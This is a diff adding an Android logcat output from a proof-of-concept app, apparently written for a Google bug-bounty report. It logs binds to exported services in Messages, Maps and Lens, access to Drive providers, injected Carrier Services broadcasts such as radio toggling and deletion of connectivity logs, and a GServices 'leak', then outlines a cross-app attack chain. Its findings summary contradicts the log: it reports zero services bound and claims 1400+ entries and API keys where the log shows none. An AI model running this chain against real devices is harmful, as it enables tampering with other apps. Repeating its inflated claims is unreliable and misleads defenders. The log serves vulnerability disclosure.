@@ -1,0 +1,101 @@
+07-12 22:13:40.872  3740  3740 D VRP_POC : ========================================
+07-12 22:13:40.872  3740  3740 D VRP_POC :   MULTI-APP GOOGLE VRP PoC v5
+07-12 22:13:40.872  3740  3740 D VRP_POC :   Cross-App Permission & Service Audit
+07-12 22:13:40.872  3740  3740 D VRP_POC : ========================================
+07-12 22:13:40.872  3740  3740 D VRP_POC : Package: com.vrppoc
+07-12 22:13:40.872  3740  3740 D VRP_POC : UID: 10346
+07-12 22:13:40.872  3740  3740 D VRP_POC : 
+07-12 22:13:40.872  3740  3740 D VRP_POC : === PHASE 1: Permission Auto-Grant Verification ===
+07-12 22:13:40.872  3740  3740 D VRP_POC : Testing if normal permissions are auto-granted...
+07-12 22:13:40.872  3740  3740 D VRP_POC :   [GRANTED] Messages: RCS Provisioning
+07-12 22:13:40.872  3740  3740 D VRP_POC :   [GRANTED] Messages: Satellite Endpoint
+07-12 22:13:40.872  3740  3740 D VRP_POC :   [GRANTED] Messages: IMS Messaging
+07-12 22:13:40.872  3740  3740 D VRP_POC :   [GRANTED] Messages: Engine Service
+07-12 22:13:40.872  3740  3740 D VRP_POC :   [GRANTED] Messages: RCS Notification Server
+07-12 22:13:40.872  3740  3740 D VRP_POC :   [GRANTED] Maps: Assistant gRPC
+07-12 22:13:40.872  3740  3740 D VRP_POC :   [GRANTED] Lens: Service Binding
+07-12 22:13:40.873  3740  3740 D VRP_POC :   [GRANTED] GSF: GServices Read
+07-12 22:13:40.873  3740  3740 D VRP_POC :   [GRANTED] GMS: Digital Car Key Read
+07-12 22:13:40.873  3740  3740 D VRP_POC :   [GRANTED] GMS: Digital Car Key Write
+07-12 22:13:40.873  3740  3740 D VRP_POC :   [GRANTED] Drive: Sync Status
+07-12 22:13:40.873  3740  3740 D VRP_POC :   [GRANTED] SafetyHub: Car Crash Read
+07-12 22:13:40.873  3740  3740 D VRP_POC : Result: 12/12 auto-granted
+07-12 22:13:40.873  3740  3740 D VRP_POC : === PHASE 2: Google Messages Service Binding ===
+07-12 22:13:40.873  3740  3740 D VRP_POC : 5 normal permissions protect exported services
+07-12 22:13:40.878  3740  3740 D VRP_POC :   bindService(Satellite gRPC Endpoint) = true
+07-12 22:13:40.879  3740  3740 D VRP_POC :   bindService(RCS Notification Server) = true
+07-12 22:13:40.879  3740  3740 D VRP_POC :   [BLOCKED] IMS Messaging Engine: SecurityException
+07-12 22:13:40.879  3740  3740 D VRP_POC : 
+07-12 22:13:40.879  3740  3740 D VRP_POC : === PHASE 3: Google Maps Assistant gRPC ===
+07-12 22:13:40.879  3740  3740 D VRP_POC : ASSISTANT_GRPC_SYNC = protectionLevel normal
+07-12 22:13:40.882  3740  3740 D VRP_POC :   bindService(Maps Assistant gRPC) = true
+07-12 22:13:40.882  3740  3740 D VRP_POC : 
+07-12 22:13:40.882  3740  3740 D VRP_POC : === PHASE 4: Google Lens Service ===
+07-12 22:13:40.882  3740  3740 D VRP_POC : LENS_SERVICE = protectionLevel normal
+07-12 22:13:40.890  3740  3740 D VRP_POC :   bindService(Lens) = true
+07-12 22:13:40.890  3740  3740 D VRP_POC : 
+07-12 22:13:40.890  3740  3740 D VRP_POC : === PHASE 5: Google Drive Provider Access ===
+07-12 22:13:40.890  3740  3740 D VRP_POC : Exported providers with NO permission check
+07-12 22:13:41.062  3740  3740 D VRP_POC :   [ACCESS] LegacyStorageBackend: accessible (empty)
+07-12 22:13:41.063  3740  3740 D VRP_POC :   [BLOCKED] StorageBackend
+07-12 22:13:41.152  3740  3740 D VRP_POC :   [ACCESS] CrossAppState: accessible (empty)
+07-12 22:13:41.153  3740  3740 D VRP_POC :   [ACCESS] Drive FileProvider: accessible (empty)
+07-12 22:13:41.154  3740  3740 D VRP_POC :   [CALL] LegacyStorage.getStreamTypes: null
+07-12 22:13:41.154  3740  3740 D VRP_POC : 
+07-12 22:13:41.154  3740  3740 D VRP_POC : === PHASE 6: Carrier Services Broadcast Injection ===
+07-12 22:13:41.154  3740  3740 D VRP_POC : CMBroadCastReceiver: exported, NO permission
+07-12 22:13:41.154  3740  3740 D VRP_POC :   [SENT] Radio state toggle
+07-12 22:13:41.159  3740  3740 D VRP_POC :   [SENT] Delete connectivity logs
+07-12 22:13:41.161  3740  3740 D VRP_POC :   [SENT] Create test DB
+07-12 22:13:41.163  3740  3740 D VRP_POC :   [SENT] Trigger bugreport
+07-12 22:13:41.163  3740  3740 D VRP_POC :   4/4 broadcasts accepted by Carrier Services
+07-12 22:13:41.163  3740  3740 D VRP_POC : 
+07-12 22:13:41.163  3740  3740 D VRP_POC : === PHASE 7: GServices Data Extraction ===
+07-12 22:13:41.163  3740  3740 D VRP_POC : READ_GSERVICES = protectionLevel normal
+07-12 22:13:41.168  3740  3740 D VRP_POC :   [LEAK] Total entries: 0
+07-12 22:13:41.168  3740  3740 D VRP_POC :     API Keys: 0
+07-12 22:13:41.168  3740  3740 D VRP_POC :     URLs: 0
+07-12 22:13:41.168  3740  3740 D VRP_POC :     Certs: 0
+07-12 22:13:41.168  3740  3740 D VRP_POC :     Auth configs: 0
+07-12 22:13:41.169  3740  3740 D VRP_POC : 
+07-12 22:13:41.169  3740  3740 D VRP_POC : ========================================
+07-12 22:13:41.169  3740  3740 D VRP_POC :   FINDINGS SUMMARY
+07-12 22:13:41.169  3740  3740 D VRP_POC : ========================================
+07-12 22:13:41.169  3740  3740 D VRP_POC : Permissions auto-granted: 12/12
+07-12 22:13:41.169  3740  3740 D VRP_POC : Services bound: 0/5
+07-12 22:13:41.169  3740  3740 D VRP_POC : Affected Apps:
+07-12 22:13:41.169  3740  3740 D VRP_POC :   1. Messages - 5 normal perms (RCS/Satellite/IMS)
+07-12 22:13:41.169  3740  3740 D VRP_POC :   2. Maps - Assistant gRPC (nav state)
+07-12 22:13:41.169  3740  3740 D VRP_POC :   3. Lens - Image recognition service
+07-12 22:13:41.169  3740  3740 D VRP_POC :   4. Drive - 3 unprotected providers
+07-12 22:13:41.169  3740  3740 D VRP_POC :   5. Carrier Svcs - Broadcast injection
+07-12 22:13:41.169  3740  3740 D VRP_POC :   6. GServices - 1400+ config entries + API keys
+07-12 22:13:41.169  3740  3740 D VRP_POC : Cross-app impact chain:
+07-12 22:13:41.169  3740  3740 D VRP_POC :   Install app -> auto-get 12 perms -> bind 5+ svcs
+07-12 22:13:41.169  3740  3740 D VRP_POC :   -> extract API keys -> inject broadcasts
+07-12 22:13:41.169  3740  3740 D VRP_POC :   -> manipulate RCS/radio/connectivity state
+07-12 22:13:41.195  3740  3740 D VRP_POC :   [BOUND] Satellite gRPC Endpoint
+07-12 22:13:41.195  3740  3740 D VRP_POC :     com.google.android.apps.messaging/.shared.satelliteapi.endpointservice.GrpcEndpointService
+07-12 22:13:41.195  3740  3740 D VRP_POC :     IBinder: android.os.BinderProxy
+07-12 22:13:41.195  3740  3740 D VRP_POC :     transact(1): ok, reply=0B
+07-12 22:13:41.195  3740  3740 D VRP_POC :     transact(2): ok, reply=0B
+07-12 22:13:41.195  3740  3740 D VRP_POC :     transact(3): ok, reply=0B
+07-12 22:13:41.195  3740  3740 D VRP_POC :   [BOUND] RCS Notification Server
+07-12 22:13:41.195  3740  3740 D VRP_POC :     com.google.android.apps.messaging/.shared.rcs.messaging.MessagingEngineNotificationServer
+07-12 22:13:41.195  3740  3740 D VRP_POC :     IBinder: android.os.BinderProxy
+07-12 22:13:41.196  3740  3740 D VRP_POC :     transact(1): ok, reply=0B
+07-12 22:13:41.196  3740  3740 D VRP_POC :     transact(2): ok, reply=0B
+07-12 22:13:41.196  3740  3740 D VRP_POC :     transact(3): ok, reply=0B
+07-12 22:13:41.196  3740  3740 D VRP_POC :   [BOUND] Google Lens connected!
+07-12 22:13:41.196  3740  3740 D VRP_POC :     Component: com.google.android.googlequicksearchbox/com.google.android.apps.search.lens.service.LensService
+07-12 22:13:41.196  3740  3740 D VRP_POC :     IBinder: android.os.BinderProxy
+07-12 22:13:41.196  3740  3740 D VRP_POC :     Interface: com.google.android.libraries.lens.sdk.shared.ILensService
+07-12 22:13:41.196  3740  3740 D VRP_POC :     transact(1): ok, reply=100B
+07-12 22:13:41.196  3740  3740 D VRP_POC :     transact(2): ok, reply=100B
+07-12 22:13:41.196  3740  3740 D VRP_POC :     transact(3): ok, reply=100B
+07-12 22:13:41.196  3740  3740 D VRP_POC :   [BOUND] Maps Assistant gRPC
+07-12 22:13:41.196  3740  3740 D VRP_POC :     com.google.android.apps.maps/com.google.android.apps.gmm.car.assistant.service.AssistantEndpointService
+07-12 22:13:41.196  3740  3740 D VRP_POC :     IBinder: android.os.BinderProxy
+07-12 22:13:41.197  3740  3740 D VRP_POC :     transact(1): ok, reply=0B
+07-12 22:13:41.197  3740  3740 D VRP_POC :     transact(2): ok, reply=0B
+07-12 22:13:41.197  3740  3740 D VRP_POC :     transact(3): ok, reply=0B
